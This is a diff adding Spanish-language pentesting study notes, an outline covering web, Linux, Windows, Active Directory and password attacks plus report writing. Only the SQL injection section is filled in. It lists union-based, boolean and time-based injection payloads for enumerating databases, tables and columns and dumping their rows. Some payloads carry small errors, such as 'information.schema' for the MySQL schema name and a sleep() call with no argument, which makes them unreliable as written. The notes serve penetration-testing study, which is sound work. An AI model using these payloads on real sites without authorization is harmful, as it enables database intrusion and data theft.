@@ -1,0 +1,65 @@
+Pentest de aplicaciones WEB.
+    -SQLi
+        -Error based SQLi: Inyección basada en romper la estructura de la query para visualizar el error, entender la consulta y alterar la misma.
+        Posibles payloads a probar: ' ) - ( , . ; : { } 
+            -Enumeración de cantidad de columnas: union select 1,2,3,4... (Hasta que el error desaparezca)
+            -Enumeración de base de datos utilizando la función "database()": union select 1,2,database();
+            -Enumeración de tablas utilizando la base de datos "information": union select 1,2,group_concat(table_name) from information.schema.tables where        table_schema = "Nombre de la BD";
+            -Enumeración de columnas utilizando la base de datos "information": union select 1,2,group_concat(column_name) from information.schema.columns where table_name = "Nombre de la tabla"'
+            -Desplegar información de la tabla: union select 1,2,group_concat(columna1, ":", columna2 SEPARATOR '<br>') from TABLA01;
+         -Time boolean SQLi: Inyección basada en la respuesta el boolean de respuesta".
+            -Enumeración de base de datos utilizando "like" letra a letra (script): union select 1,2,3 where database() like '%a';-- 
+            -Enumeración de tablas utilizando "like" letra a letra (script): union select 1,2,3 from information.schema.tables where table_schema = 'DB' and table_name like 'a%';--
+            -Enumeración de columnas utilizando "like" letra a letra (script): union select 1,2,3 from information.schema.columns where table_schema = 'DB' and table_name = 'tabla01' and column_name like '%a' and column_name != 'id';--
+         -Time based SQLi: Inyección basada en pausas cuando el condicional es "true".
+            -Enumeración de base de datos utilizando "like" y "sleep()"(script): union select 1,sleep() and database() like 'd%';--
+            
+    -XSS
+    -XXE
+    -SSRF
+    -LFI
+    -RDI
+    -XPath injection
+    -LDAP injection
+    
+Pentest sobre linux.
+    -Herramientas
+    -Descubrimiento de puertos
+    -Información de versiones
+    -Enumeración
+    -Identificación de exploits
+    -Troubleshooting
+    -Escalación de privilegios
+    -Pivoting
+    -BufferOverflow (x86,x64)
+    
+Pentest sobre windows.
+    -Herramientas
+    -Descubrimiento de puertos
+    -Información de versiones
+    -Enumeración
+    -Identificación de exploits
+    -Troubleshooting
+    -Escalación de privilegios
+    -Pivoting
+    -BufferOverflow (x86,x64)
+    
+Pentest sobre Active Directory.
+    -Herramientas
+    -Descubrimiento de puertos
+    -Información de versiones
+    -Enumeración
+    -Ataques a Active Directory
+    
+Ataque a contraseñas.
+    -Crackeado con Jhon
+    -Crackeado con Hashcat
+    -Rainbow tables
+    -Creación de diccionarios
+    
+Documentación.
+    -Estructura informe
+    -Lenguaje ejecutivo
+    -Lenguaje técnico
+    -Footprint
+    -Evidencia
